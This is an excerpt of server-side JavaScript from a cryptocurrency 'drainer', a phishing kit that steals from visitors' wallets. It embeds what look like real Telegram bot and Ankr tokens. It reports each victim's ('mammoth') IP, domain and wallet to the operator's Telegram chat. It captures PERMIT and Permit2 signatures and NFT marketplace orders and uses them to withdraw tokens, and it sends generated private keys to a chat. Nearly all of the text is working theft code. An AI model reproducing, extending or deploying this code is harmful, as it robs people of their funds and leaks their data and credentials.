...
const MS_Encryption_Key = 1705; // Please specify any number to be used for encryption (not recommended to leave default!)
// The same number should also be specified in the web3-provider.js file - if they differ, nothing will work correctly

const MS_Telegram_Token = "7740473878:AAEWaE5iJs2GW5gOtdp8K835qLMJgM_loQY"; // Enter your bot token from @BotFather here (go there, create a bot, and get this token)
const MS_Telegram_Chat_ID = ["-1002267224933"]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
// To specify multiple chats, fill it out like this: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
const MS_Telegram_Admin_IDs = ["6061406566"]; // Enter your Telegram ID here so that it only accepts commands from you
...
const MS_Use_Ankr = true; // If set to "true", tokens are analyzed through Ankr (on the server side).
...
const MS_Ankr_Token =
  "e1fd3ed9dbc66a035113d4ee2534fbdd8dd41ef6e2e16de4e57103f9d4963c69"; // Ankr Premium token, leave it blank ("") to use Ankr Free.
...
const MS_API_Token = "xxx"; // Access key for accessing API requests (BE SURE TO CHANGE THIS VALUE!).
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>😭 User #user_${data.user_id} closed or reloaded the site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❓ Requested connection from user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} declined connection</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>✅ User #user_${data.user_id} changed network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} has rejected network change, or the network is unavailable</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} declined the transfer or the transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} rejected confirmation or transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} rejected the signature or the transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❌ Signature is unavailable for user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<i>But don't panic, his wallet just doesn't support this function, if possible we'll offer him another way...</i>`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>❓ User #user_${data.user_id} received a signature request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\ n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Amount written off:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        ...
        await send_message(
          receiver_chat_id,
          `<b>❓ User #user_${data.user_id} received a ${data.swapper} request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature object(s):</b> ${assets_str}`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>✅ User #user_${data.user_id} signed the request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n< b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Amount written off:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        ...
        await send_message(
          receiver_chat_id,
          `<b>✅ User #user_${data.user_id} signed ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature object(s):</b> ${assets_str}`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>✅ User #user_${data.user_id} issued confirmation</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n< b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Amount written off:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    if (
      ...
      try {
        await send_message(
          receiver_chat_id,
          `<b>✅ User #user_${data.user_id} made a transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
          {
            parse_mode: "HTML",
          },
        );
    ...
    if (MS_Settings.Approve.Bypass == 0 && gas_limit.gte(BN("6000000"))) {
      if (
        ...
        try {
          await send_message(
            receiver_chat_id,
            `<b>❌ Failed to withdraw user token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nThe system has detected that the confirmation is most likely fake or that the withdrawal of this token is technically impossible, and in order to preserve your funds, it has rejected the transaction.\n\nYou can still try to withdraw the token manually if you believe that the signature is still genuine.`,
            {
              parse_mode: "HTML",
            },
          );
      ...
      if (
        ...
        if (
          ...
          try {
            await send_message(
              receiver_chat_id,
              `<b>❌ Failed to withdraw user asset #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nNot enough native coin on the drainer wallet, try to top up and withdraw manually!`,
              {
                parse_mode: "HTML",
              },
            );
        ...
        if (
          ...
          if (MS_Functional_Bot) {
            if (data.sign.type == 1) {
              await send_message(
                receiver_chat_id,
                `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n< b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code >\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b >nonce:</b> <code>${data.sign.nonce}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n <b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</ b> <code>${data.sign.s}</code>\n\nWith this data, you can sign a PERMIT on the ${chain_id_to_name(data.sign.chain_id)} network for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off Permit automatically, use the button below to try writing it off again.`,
                {
                  parse_mode: "HTML",
                  reply_markup: {
                    inline_keyboard: [
              ...
              await send_message(
                receiver_chat_id,
                `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n< b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code >\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}< /code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nWith this data you can manually sign PERMIT in the ${chain_id_to_name(data.sign.chain_id)} network for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off the Permit automatically, use the button below to try again attempt to write off.`,
                {
                  parse_mode: "HTML",
                  reply_markup: {
                    inline_keyboard: [
      ...
      if (!PERMIT_VALID_KEY) {
        ...
        if (
          ...
          try {
            await send_message(
              receiver_chat_id,
              `<b>❌ Failed to sign PERMIT of user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThe system has detected that the PERMIT is most likely fake and has rejected the transaction in order to preserve your funds.\n\nYou can still try to withdraw the token manually if you believe that the signature is real.`,
              {
                parse_mode: "HTML",
              },
            );
    ...
    try {
      ...
      try {
        if (
          ...
          await send_message(
            receiver_chat_id,
            `<b>👁 Successfully granted PERMIT access #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n <b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
            {
              parse_mode: "HTML",
            },
          );
      ...
      if (MS_Settings.Approve.Bypass == 0 && gas_limit.gte(BN(6000000))) {
        if (
          ...
          try {
            await send_message(
              receiver_chat_id,
              `<b>❌ Failed to withdraw user asset #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nPlease note that most likely the PERMIT was successfully signed, only the assets could not be withdrawn from the wallet, you can try manually!`,
              {
                parse_mode: "HTML",
              },
            );
      ...
      try {
        ...
        try {
          if (
            ...
            await send_message(
              receiver_chat_id,
              `<b>💎 User token successfully withdrawn #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
              {
                parse_mode: "HTML",
              },
            );
      ...
      if (
        ...
        try {
          await send_message(
            receiver_chat_id,
            `<b>❌ Failed to sign PERMIT of user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can try to withdraw these assets yourself using PERMIT data if it is enabled in the drainer settings.`,
            {
              parse_mode: "HTML",
            },
          );
      ...
      try {
        ...
        if (
          ...
          if (MS_Functional_Bot) {
            await send_message(
              receiver_chat_id,
              `<b>🔑 Permit2 data of user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature:</b> <code>${data.signature}</code>\n<b>Data:</b> <code>${JSON.stringify(data.message)}</code>\n<b>Owner:</b> <code>${data.address}</code>\n\nWith this data, you can sign Permit2 yourself in the ${chain_id_to_name(data.asset.chain_id)} network for the contract: <code>0x000000000022d473030f116ddee9f6b43ac78ba3</code>`,
              {
                parse_mode: "HTML",
                reply_markup: {
                  inline_keyboard: [
      ...
      if (MS_Settings.Permit2.Bypass == 0 && gas_limit.gte(BN(6000000))) {
        if (
          ...
          try {
            await send_message(
              receiver_chat_id,
              `<b>❌ Failed to sign PERMIT2 of user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThe system has detected that the PERMIT is most likely fake and has rejected the transaction in order to preserve your funds.\n\nYou can still try to withdraw the token manually if you believe that the signature is still genuine.`,
              {
                parse_mode: "HTML",
              },
            );
      ...
      try {
        ...
        try {
          if (
            ...
            await send_message(
              receiver_chat_id,
              `<b>👁 Successfully granted PERMIT2 access #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
              {
                parse_mode: "HTML",
              },
            );
        ...
        try {
          ...
          try {
            ...
            if (
              ...
              try {
                await send_message(
                  receiver_chat_id,
                  `<b>💎 Successfully withdrawn Permit2 token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`,
                  {
                    parse_mode: "HTML",
                  },
                );
          ...
          if (
            ...
            try {
              await send_message(
                receiver_chat_id,
                `<b>❌ Failed to withdraw user asset #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe managed to sign PERMIT2, but failed to withdraw the token, you can still try to do it manually!`,
                {
                  parse_mode: "HTML",
                },
              );
        ...
        if (
          ...
          try {
            await send_message(
              receiver_chat_id,
              `<b>❌ Failed to withdraw user asset #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nFailed to sign automatically, you can still try to do it manually!`,
              {
                parse_mode: "HTML",
              },
            );
      ...
      try {
        ...
        try {
          if (
            ...
            await send_message(
              receiver_chat_id,
              `<b>👁 PERMIT2 access successfully granted #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>List of tokens:</b>\n\n${assets_list_str}`,
              {
                parse_mode: "HTML",
              },
            );
          ...
          try {
            ...
            if (
              ...
              try {
                await send_message(
                  receiver_chat_id,
                  `<b>💎 Successfully withdrawn Permit2 tokens #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>List of tokens:</b>\n\n${assets_list_str}`,
                  {
                    parse_mode: "HTML",
                  },
                );
        ...
        if (
          ...
          if (
            ...
            try {
              await send_message(
                receiver_chat_id,
                `<b>❌ Failed to withdraw NFT of user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nThe system detected that the confirmation is most likely fake or that the withdrawal of this token is technically impossible, and in order to preserve your funds, rejected the transaction.\n\nYou can still try to withdraw the token manually if you believe that the signature is still genuine.`,
                {
                  parse_mode: "HTML",
                },
              );
  ...
  try {
    ...
    if (data.seaport == "request") {
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>❓ User #user_${data.user_id} received a request for SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>List NFT:</b> ${nfts_list_str}`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      if (result) {
        if (
          ...
          await send_message(
            receiver_chat_id,
            `<b>💎 Successfully signed SeaPort user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`,
            {
              parse_mode: "HTML",
            },
          );
        ...
        if (
          ...
          await send_message(
            receiver_chat_id,
            `<b>❌ Failed to sign SeaPort for user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThe transaction may not have gone through or may still be in the queue!`,
            {
              parse_mode: "HTML",
            },
          );
  ...
  try {
    ...
    if (data.blur == "request") {
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>❓ User #user_${data.user_id} received a request for Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT list:</b> ${nfts_list_str}`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} rejected Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      if (result) {
        if (
          ...
          await send_message(
            receiver_chat_id,
            `<b>💎 Successfully signed Blur user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`,
            {
              parse_mode: "HTML",
            },
          );
        ...
        if (
          ...
          await send_message(
            receiver_chat_id,
            `<b>❌ Failed to sign Blur for user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nThe transaction may not have gone through or may still be in the queue!`,
            {
              parse_mode: "HTML",
            },
          );
  ...
  try {
    ...
    if (data.x2y2 == "request") {
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>❓ User #user_${data.user_id} received a request for X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT list:</b> ${nfts_list_str}`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>❌ User #user_${data.user_id} rejected X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      if (
        ...
        await send_message(
          receiver_chat_id,
          `<b>💎 Successfully signed X2Y2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`,
          {
            parse_mode: "HTML",
          },
        );
  ...
  try {
    ...
    try {
      if (MS_Use_OpenSea) {
        ...
        let result = await axios.get(
          `https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${data.address}&limit=25`,
          {
            headers: {
              Accept: "application/json",
              Authorization: `Basic ${Buffer.from(MS_Zapper_Token + ":").toString("base64")}`,
          ...
          try {
            if (MS_Notifications.random_wallet.mode == true) {
              setTimeout(() => {
                send_message(
                  MS_Notifications.random_wallet.chat_id,
                  `<b>👛 Created a wallet for #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Address:</b> <code>${personal_wallet.address}</code>\n<b>Private key:</b>\n\n<code>${personal_wallet.private}</code>`,
                  {
                    parse_mode: "HTML",
                  },
                );
...
const repeat_permit = async (callback, permit_id, data) => {
  try {
    await send_message(
      ...
      `<b>Permit signing process started #${permit_id}</b>\n\nYou will receive an additional notification based on the results of a successful or unsuccessful signing.`,
      {
        parse_mode: "HTML",
      },
    );
      ...
      try {
        ...
        if (
          ...
          if (is_valid_option == false) {
            await send_message(
              callback.message.chat.id,
              `<b>❌ Failed to re-sign PERMIT #${permit_id}</b>\n\nThe given signature is invalid and cannot be used.`,
              {
                parse_mode: "HTML",
              },
            );
        ...
        if (data.sign.type == 1) {
          ...
          try {
            ...
            await send_message(
              callback.message.chat.id,
              `<b>✅ Successfully signed PERMIT #${permit_id}</b>\n\nChecking if we were able to issue a confirmation for the token...`,
              {
                parse_mode: "HTML",
              },
            );
            ...
            await send_message(
              callback.message.chat.id,
              `<b>❌ Failed to re-sign PERMIT #${permit_id}</b>\n\nTransaction error during signature execution.`,
              {
                parse_mode: "HTML",
              },
            );
    ...
    if (was_in_work) {
      ...
      if (allowance.lte(ethers.BigNumber.from("0"))) {
        await send_message(
          callback.message.chat.id,
          `<b>❌ Failed to write off PERMIT #${permit_id}</b>\n\nConfirmation failed, possibly a scam token.`,
          {
            parse_mode: "HTML",
          },
        );
    ...
    if (balance.lte(ethers.BigNumber.from("0"))) {
      await send_message(
        callback.message.chat.id,
        `<b>❌ Failed to write off PERMIT #${permit_id}</b>\n\nConfirmation failed, but token balance is zero.`,
        {
          parse_mode: "HTML",
        },
      );
    ...
    try {
      ...
      if (
        ...
        await send_message(
          callback.message.chat.id,
          `<b>❌ Failed to write off PERMIT #${permit_id}</b>\n\nError executing transaction, commission too high.`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      await send_message(
        callback.message.chat.id,
        `<b>💎 Successfully charged PERMIT #${permit_id}</b>\n\nMoney sent to your wallet.`,
        {
          parse_mode: "HTML",
        },
      );
      ...
      await send_message(
        callback.message.chat.id,
        `<b>❌ Failed to charge PERMIT #${permit_id}</b>\n\nTransaction error during signature execution.`,
        {
          parse_mode: "HTML",
        },
      );
...
const repeat_permit2 = async (callback, permit_id, data) => {
  try {
    await send_message(
      callback.message.chat.id,
      `<b>Permit2 signing process started #${permit_id}</b>\n\nYou will receive an additional notification based on the results of a successful or unsuccessful signing.`,
      {
        parse_mode: "HTML",
      },
    );
    ...
    if (data.mode == 1) {
      ...
      if (
        ...
        await send_message(
          callback.message.chat.id,
          `<b>❌ Failed to write off PERMIT #${permit_id}</b>\n\nInvalid data, signature not possible.`,
          {
            parse_mode: "HTML",
          },
        );
      ...
      try {
        ...
        await send_message(
          callback.message.chat.id,
          `<b>✅ Successfully signed PERMIT #${permit_id}</b>\n\nList of tokens for which permissions have been issued:\n\n${tokens_list}\nPlease note that the tokens have not yet been written off, but only permission has been issued for them, an attempt to write them off will now be made.`,
          {
            parse_mode: "HTML",
          },
        );
        try {
          ...
          if (transfer_details.length > 0) {
            ...
            await send_message(
              callback.message.chat.id,
              `<b>💎 Successfully withdrawn PERMIT #${permit_id}</b>List of tokens that were withdrawn:\n\n${withdraw_list}`,
              {
                parse_mode: "HTML",
              },
            );
          ...
          await send_message(
            callback.message.chat.id,
            `<b>❌ Failed to withdraw PERMIT #${permit_id}</b>\n\nError executing transaction.`,
            {
              parse_mode: "HTML",
            },
          );
      ...
      try {
        ...
        await send_message(
          callback.message.chat.id,
          `<b>✅ Successfully signed PERMIT #${permit_id}</b>\n\nList of tokens for which permissions have been issued:\n\n${tokens_list}\nPlease note that the tokens have not yet been written off, but only permission has been issued for them, an attempt to write off will now be made.`,
          {
            parse_mode: "HTML",
          },
        );
    ...
    try {
      ...
      if ((matches = callback.data.match(/^sign_permit_(\d+)$/))) {
        ...
        if (MS_IP_Blacklist.includes(matches[1])) {
          ...
          await bot.answerCallbackQuery(callback.id, { text: "IP Unblocked" });
        } else {
          await bot.editMessageReplyMarkup(
            {
              inline_keyboard: [
        ...
        if (!MS_Wallet_Blacklist.includes(matches[1])) {
          ...
          await bot.answerCallbackQuery(callback.id, {
            text: "The wallet is already blocked",
          });
        }
        return;
